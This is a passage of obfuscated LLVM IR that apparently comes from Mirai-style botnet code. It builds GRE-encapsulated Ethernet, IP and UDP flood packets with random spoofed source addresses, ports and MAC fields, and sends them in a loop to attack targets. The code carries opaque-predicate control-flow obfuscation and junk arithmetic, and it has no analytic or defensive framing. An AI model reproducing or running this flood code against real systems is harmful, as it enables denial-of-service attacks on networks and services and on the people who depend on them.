  %370 = getelementptr inbounds i8*, i8** %367, i64 %369
  %371 = load i8*, i8** %370, align 8
  store i8* %371, i8** %30, align 8
  %372 = load i8*, i8** %30, align 8
  %373 = bitcast i8* %372 to %struct.iphdr*
  store %struct.iphdr* %373, %struct.iphdr** %31, align 8
  %374 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i64 1
  %376 = bitcast %struct.iphdr* %375 to %struct.grehdr*
  store %struct.grehdr* %376, %struct.grehdr** %32, align 8
  %377 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %378 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %377, i64 1
  %379 = bitcast %struct.grehdr* %378 to %struct.ethhdr*
  store %struct.ethhdr* %379, %struct.ethhdr** %33, align 8
  %380 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %381 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %380, i64 1
  %382 = bitcast %struct.ethhdr* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %34, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.udphdr*
  store %struct.udphdr* %385, %struct.udphdr** %35, align 8
  %386 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i64 1
  %388 = bitcast %struct.udphdr* %387 to i8*
  store i8* %388, i8** %36, align 8
  %389 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i32 0, i32 2
  %394 = load i8, i8* %393, align 4
  %395 = zext i8 %394 to i32
  %396 = icmp slt i32 %395, 32
  %397 = load i32, i32* @x.21
  %398 = load i32, i32* @y.22
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %396, label %405, label %426

; <label>:405:                                    ; preds = %originalBBpart290
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 1
  %411 = load i32, i32* %410, align 4
  %412 = call i32 @ntohl(i32 %411) #7
  %413 = call i32 @rand_next()
  %414 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 2
  %419 = load i8, i8* %418, align 4
  %420 = zext i8 %419 to i32
  %421 = lshr i32 %413, %420
  %422 = add i32 %412, %421
  %423 = call i32 @htonl(i32 %422) #7
  %424 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 9
  store i32 %423, i32* %425, align 4
  br label %426

; <label>:426:                                    ; preds = %405, %originalBBpart290
  %427 = load i32, i32* %21, align 4
  %428 = icmp eq i32 %427, -1
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %426
  %430 = call i32 @rand_next()
  %431 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 8
  store i32 %430, i32* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %429, %426
  %434 = load i16, i16* %13, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %452

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = and i32 %438, 65535
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  %443 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 3
  %445 = load i16, i16* %444, align 4
  %446 = zext i16 %445 to i32
  %447 = sub nsw i32 %446, 1000
  %448 = xor i32 %447, -1
  %449 = trunc i32 %448 to i16
  %450 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 3
  store i16 %449, i16* %451, align 4
  br label %452

; <label>:452:                                    ; preds = %437, %433
  %453 = load i32, i32* @x.21
  %454 = load i32, i32* @y.22
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %452
  %461 = load i16, i16* %16, align 2
  %462 = zext i16 %461 to i32
  %463 = icmp eq i32 %462, 65535
  %464 = load i32, i32* @x.21
  %465 = load i32, i32* @y.22
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %463, label %472, label %494

; <label>:472:                                    ; preds = %originalBBpart294
  %473 = load i32, i32* @x.21
  %474 = load i32, i32* @y.22
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %472
  %481 = call i32 @rand_next()
  %482 = and i32 %481, 65535
  %483 = trunc i32 %482 to i16
  %484 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %485 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %484, i32 0, i32 0
  store i16 %483, i16* %485, align 2
  %486 = load i32, i32* @x.21
  %487 = load i32, i32* @y.22
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart299, label %originalBB96alteredBB

originalBBpart299:                                ; preds = %originalBB96
  br label %494

; <label>:494:                                    ; preds = %originalBBpart299, %originalBBpart294
  %495 = load i16, i16* %17, align 2
  %496 = zext i16 %495 to i32
  %497 = icmp eq i32 %496, 65535
  br i1 %497, label %498, label %520

; <label>:498:                                    ; preds = %494
  %499 = load i32, i32* @x.21
  %500 = load i32, i32* @y.22
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %498
  %507 = call i32 @rand_next()
  %508 = and i32 %507, 65535
  %509 = trunc i32 %508 to i16
  %510 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %511 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %510, i32 0, i32 1
  store i16 %509, i16* %511, align 2
  %512 = load i32, i32* @x.21
  %513 = load i32, i32* @y.22
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart2106, label %originalBB101alteredBB

originalBBpart2106:                               ; preds = %originalBB101
  br label %520

; <label>:520:                                    ; preds = %originalBBpart2106, %494
  %521 = load i32, i32* @x.21
  %522 = load i32, i32* @y.22
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %520
  %529 = load i8, i8* %20, align 1
  %530 = icmp ne i8 %529, 0
  %531 = load i32, i32* @x.21
  %532 = load i32, i32* @y.22
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %530, label %543, label %539

; <label>:539:                                    ; preds = %originalBBpart2110
  %540 = call i32 @rand_next()
  %541 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 9
  store i32 %540, i32* %542, align 4
  br label %549

; <label>:543:                                    ; preds = %originalBBpart2110
  %544 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 9
  %546 = load i32, i32* %545, align 4
  %547 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 9
  store i32 %546, i32* %548, align 4
  br label %549

; <label>:549:                                    ; preds = %543, %539
  %550 = call i32 @rand_next()
  store i32 %550, i32* %37, align 4
  %551 = call i32 @rand_next()
  store i32 %551, i32* %38, align 4
  %552 = call i32 @rand_next()
  store i32 %552, i32* %39, align 4
  %553 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %554 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %553, i32 0, i32 0
  %555 = getelementptr inbounds [6 x i8], [6 x i8]* %554, i32 0, i32 0
  %556 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %555, i8* %556, i32 4)
  %557 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %558 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %557, i32 0, i32 1
  %559 = getelementptr inbounds [6 x i8], [6 x i8]* %558, i32 0, i32 0
  %560 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %559, i8* %560, i32 4)
  %561 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %562 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %561, i32 0, i32 0
  %563 = getelementptr inbounds [6 x i8], [6 x i8]* %562, i32 0, i32 0
  %564 = getelementptr inbounds i8, i8* %563, i64 4
  %565 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %564, i8* %565, i32 2)
  %566 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %567 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %566, i32 0, i32 1
  %568 = getelementptr inbounds [6 x i8], [6 x i8]* %567, i32 0, i32 0
  %569 = getelementptr inbounds i8, i8* %568, i64 4
  %570 = bitcast i32* %39 to i8*
  %571 = getelementptr inbounds i8, i8* %570, i64 2
  call void @util_memcpy(i8* %569, i8* %571, i32 2)
  %572 = load i8, i8* %19, align 1
  %573 = icmp ne i8 %572, 0
  br i1 %573, label %574, label %577

; <label>:574:                                    ; preds = %549
  %575 = load i8*, i8** %36, align 8
  %576 = load i32, i32* %18, align 4
  call void @rand_str(i8* %575, i32 %576)
  br label %577

; <label>:577:                                    ; preds = %574, %549
  %578 = load i32, i32* @x.21
  %579 = load i32, i32* @y.22
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %577
  %586 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i32 0, i32 7
  store i16 0, i16* %587, align 2
  %588 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %589 = bitcast %struct.iphdr* %588 to i16*
  %590 = call zeroext i16 @checksum_generic(i16* %589, i32 20)
  %591 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %592 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %591, i32 0, i32 7
  store i16 %590, i16* %592, align 2
  %593 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 0, i16* %594, align 2
  %595 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %596 = bitcast %struct.iphdr* %595 to i16*
  %597 = call zeroext i16 @checksum_generic(i16* %596, i32 20)
  %598 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %599 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %598, i32 0, i32 7
  store i16 %597, i16* %599, align 2
  %600 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %601 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %600, i32 0, i32 3
  store i16 0, i16* %601, align 2
  %602 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %603 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %604 = bitcast %struct.udphdr* %603 to i8*
  %605 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %606 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %605, i32 0, i32 2
  %607 = load i16, i16* %606, align 2
  %608 = load i32, i32* %18, align 4
  %609 = sext i32 %608 to i64
  %610 = add i64 8, %609
  %611 = trunc i64 %610 to i32
  %612 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %602, i8* %604, i16 zeroext %607, i32 %611)
  %613 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %614 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %613, i32 0, i32 3
  store i16 %612, i16* %614, align 2
  %615 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %616 = load i32, i32* %9, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i64 %617
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %618, i32 0, i32 0
  %620 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %619, i32 0, i32 0
  store i16 2, i16* %620, align 4
  %621 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %622 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %621, i32 0, i32 9
  %623 = load i32, i32* %622, align 4
  %624 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %625 = load i32, i32* %9, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %624, i64 %626
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i32 0, i32 0
  %629 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %628, i32 0, i32 2
  %630 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %629, i32 0, i32 0
  store i32 %623, i32* %630, align 4
  %631 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %632 = load i32, i32* %9, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i64 %633
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %634, i32 0, i32 0
  %636 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %635, i32 0, i32 1
  store i16 0, i16* %636, align 2
  %637 = load i32, i32* %10, align 4
  %638 = load i8*, i8** %30, align 8
  %639 = load i32, i32* %18, align 4
  %640 = sext i32 %639 to i64
  %641 = add i64 66, %640
  %642 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %643 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %644 = load i32, i32* %9, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %643, i64 %645
  %647 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %646, i32 0, i32 0
  %648 = bitcast %struct.sockaddr_in* %647 to %struct.sockaddr*
  store %struct.sockaddr* %648, %struct.sockaddr** %642, align 8
  %649 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %650 = load %struct.sockaddr*, %struct.sockaddr** %649, align 8
  %651 = call i64 @sendto(i32 %637, i8* %638, i64 %641, i32 16384, %struct.sockaddr* %650, i32 16)
  %652 = load i32, i32* @x.21
  %653 = load i32, i32* @y.22
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2132, label %originalBB112alteredBB

originalBBpart2132:                               ; preds = %originalBB112
  br label %660

; <label>:660:                                    ; preds = %originalBBpart2132
  %661 = load i32, i32* %9, align 4
  %662 = add nsw i32 %661, 1
  store i32 %662, i32* %9, align 4
  br label %353

; <label>:663:                                    ; preds = %353
  %664 = load i32, i32* @x.21
  %665 = load i32, i32* @y.22
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %663
  %672 = load i32, i32* @x.21
  %673 = load i32, i32* @y.22
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %352

; <label>:680:                                    ; preds = %92, %86
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %101
  %681 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %682 = load i8**, i8*** %11, align 8
  %683 = load i32, i32* %9, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds i8*, i8** %682, i64 %684
  store i8* %681, i8** %685, align 8
  %686 = load i8**, i8*** %11, align 8
  %687 = load i32, i32* %9, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds i8*, i8** %686, i64 %688
  %690 = load i8*, i8** %689, align 8
  %691 = bitcast i8* %690 to %struct.iphdr*
  store %struct.iphdr* %691, %struct.iphdr** %22, align 8
  %692 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %693 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %692, i64 1
  %694 = bitcast %struct.iphdr* %693 to %struct.grehdr*
  store %struct.grehdr* %694, %struct.grehdr** %23, align 8
  %695 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %696 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %695, i64 1
  %697 = bitcast %struct.grehdr* %696 to %struct.ethhdr*
  store %struct.ethhdr* %697, %struct.ethhdr** %24, align 8
  %698 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %699 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %698, i64 1
  %700 = bitcast %struct.ethhdr* %699 to %struct.iphdr*
  store %struct.iphdr* %700, %struct.iphdr** %25, align 8
  %701 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i64 1
  %703 = bitcast %struct.iphdr* %702 to %struct.udphdr*
  store %struct.udphdr* %703, %struct.udphdr** %26, align 8
  %704 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %705 = bitcast %struct.iphdr* %704 to i8*
  %706 = load i8, i8* %705, align 4
  %_ = shl i8 %706, 15
  %_1 = sub i8 0, %706
  %gen = add i8 %_1, 15
  %_2 = sub i8 %706, 15
  %gen3 = mul i8 %_2, 15
  %_4 = shl i8 %706, 15
  %_5 = shl i8 %706, 15
  %_6 = sub i8 0, %706
  %gen7 = add i8 %_6, 15
  %_8 = sub i8 %706, 15
  %gen9 = mul i8 %_8, 15
  %707 = and i8 %706, 15
  %_10 = sub i8 0, %707
  %gen11 = add i8 %_10, 64
  %_12 = sub i8 %707, 64
  %gen13 = mul i8 %_12, 64
  %_14 = shl i8 %707, 64
  %708 = or i8 %707, 64
  store i8 %708, i8* %705, align 4
  %709 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %710 = bitcast %struct.iphdr* %709 to i8*
  %711 = load i8, i8* %710, align 4
  %_15 = sub i8 0, %711
  %gen16 = add i8 %_15, -16
  %_17 = shl i8 %711, -16
  %_18 = sub i8 0, %711
  %gen19 = add i8 %_18, -16
  %_20 = sub i8 0, %711
  %gen21 = add i8 %_20, -16
  %_22 = shl i8 %711, -16
  %712 = and i8 %711, -16
  %_23 = sub i8 %712, 5
  %gen24 = mul i8 %_23, 5
  %_25 = sub i8 %712, 5
  %gen26 = mul i8 %_25, 5
  %_27 = shl i8 %712, 5
  %_28 = sub i8 0, %712
  %gen29 = add i8 %_28, 5
  %_30 = sub i8 %712, 5
  %gen31 = mul i8 %_30, 5
  %713 = or i8 %712, 5
  store i8 %713, i8* %710, align 4
  %714 = load i8, i8* %12, align 1
  %715 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %716 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %715, i32 0, i32 1
  store i8 %714, i8* %716, align 1
  %717 = load i32, i32* %18, align 4
  %718 = sext i32 %717 to i64
  %_32 = shl i64 66, %718
  %_33 = shl i64 66, %718
  %719 = add i64 66, %718
  %720 = trunc i64 %719 to i16
  %721 = call zeroext i16 @htons(i16 zeroext %720) #7
  %722 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %723 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %722, i32 0, i32 2
  store i16 %721, i16* %723, align 2
  %724 = load i16, i16* %13, align 2
  %725 = call zeroext i16 @htons(i16 zeroext %724) #7
  %726 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i32 0, i32 3
  store i16 %725, i16* %727, align 4
  %728 = load i8, i8* %14, align 1
  %729 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %730 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %729, i32 0, i32 5
  store i8 %728, i8* %730, align 4
  %731 = load i8, i8* %15, align 1
  %732 = icmp ne i8 %731, 0
  br label %originalBB

originalBB34alteredBB:                            ; preds = %originalBB34, %174
  %733 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %734 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %733, i32 0, i32 6
  store i8 47, i8* %734, align 1
  %735 = load i32, i32* %21, align 4
  %736 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %737 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %736, i32 0, i32 8
  store i32 %735, i32* %737, align 4
  %738 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %739 = load i32, i32* %9, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %738, i64 %740
  %742 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %741, i32 0, i32 1
  %743 = load i32, i32* %742, align 4
  %744 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %745 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %744, i32 0, i32 9
  store i32 %743, i32* %745, align 4
  %746 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %747 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %748 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %747, i32 0, i32 1
  store i16 %746, i16* %748, align 2
  %749 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %750 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %751 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %750, i32 0, i32 2
  store i16 %749, i16* %751, align 1
  %752 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %753 = bitcast %struct.iphdr* %752 to i8*
  %754 = load i8, i8* %753, align 4
  %755 = and i8 %754, 15
  %_35 = sub i8 0, %755
  %gen36 = add i8 %_35, 64
  %_37 = sub i8 %755, 64
  %gen38 = mul i8 %_37, 64
  %_39 = sub i8 0, %755
  %gen40 = add i8 %_39, 64
  %_41 = sub i8 %755, 64
  %gen42 = mul i8 %_41, 64
  %756 = or i8 %755, 64
  store i8 %756, i8* %753, align 4
  %757 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %758 = bitcast %struct.iphdr* %757 to i8*
  %759 = load i8, i8* %758, align 4
  %_43 = shl i8 %759, -16
  %_44 = shl i8 %759, -16
  %_45 = sub i8 0, %759
  %gen46 = add i8 %_45, -16
  %_47 = shl i8 %759, -16
  %760 = and i8 %759, -16
  %_48 = sub i8 %760, 5
  %gen49 = mul i8 %_48, 5
  %_50 = shl i8 %760, 5
  %_51 = shl i8 %760, 5
  %761 = or i8 %760, 5
  store i8 %761, i8* %758, align 4
  %762 = load i8, i8* %12, align 1
  %763 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 1
  store i8 %762, i8* %764, align 1
  %765 = load i32, i32* %18, align 4
  %766 = sext i32 %765 to i64
  %_52 = shl i64 28, %766
  %_53 = sub i64 28, %766
  %gen54 = mul i64 %_53, %766
  %_55 = sub i64 28, %766
  %gen56 = mul i64 %_55, %766
  %_57 = shl i64 28, %766
  %_58 = sub i64 28, %766
  %gen59 = mul i64 %_58, %766
  %_60 = sub i64 0, 28
  %gen61 = add i64 %_60, %766
  %_62 = shl i64 28, %766
  %767 = add i64 28, %766
  %768 = trunc i64 %767 to i16
  %769 = call zeroext i16 @htons(i16 zeroext %768) #7
  %770 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %771 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %770, i32 0, i32 2
  store i16 %769, i16* %771, align 2
  %772 = load i16, i16* %13, align 2
  %773 = zext i16 %772 to i32
  %_63 = shl i32 %773, -1
  %_64 = shl i32 %773, -1
  %_65 = sub i32 0, %773
  %gen66 = add i32 %_65, -1
  %774 = xor i32 %773, -1
  %775 = trunc i32 %774 to i16
  %776 = call zeroext i16 @htons(i16 zeroext %775) #7
  %777 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 3
  store i16 %776, i16* %778, align 4
  %779 = load i8, i8* %14, align 1
  %780 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %781 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %780, i32 0, i32 5
  store i8 %779, i8* %781, align 4
  %782 = load i8, i8* %15, align 1
  %783 = icmp ne i8 %782, 0
  br label %originalBB34

originalBB70alteredBB:                            ; preds = %originalBB70, %242
  %784 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %785 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %786 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %785, i32 0, i32 4
  store i16 %784, i16* %786, align 2
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %262
  %787 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %788 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %787, i32 0, i32 6
  store i8 17, i8* %788, align 1
  %789 = call i32 @rand_next()
  %790 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %791 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %790, i32 0, i32 8
  store i32 %789, i32* %791, align 4
  %792 = load i8, i8* %20, align 1
  %793 = icmp ne i8 %792, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %300
  %794 = load i16, i16* %16, align 2
  %795 = call zeroext i16 @htons(i16 zeroext %794) #7
  %796 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %797 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %796, i32 0, i32 0
  store i16 %795, i16* %797, align 2
  %798 = load i16, i16* %17, align 2
  %799 = call zeroext i16 @htons(i16 zeroext %798) #7
  %800 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %801 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %800, i32 0, i32 1
  store i16 %799, i16* %801, align 2
  %802 = load i32, i32* %18, align 4
  %803 = sext i32 %802 to i64
  %_79 = sub i64 8, %803
  %gen80 = mul i64 %_79, %803
  %804 = add i64 8, %803
  %805 = trunc i64 %804 to i16
  %806 = call zeroext i16 @htons(i16 zeroext %805) #7
  %807 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %808 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %807, i32 0, i32 2
  store i16 %806, i16* %808, align 2
  br label %originalBB78

originalBB84alteredBB:                            ; preds = %originalBB84, %335
  br label %originalBB84

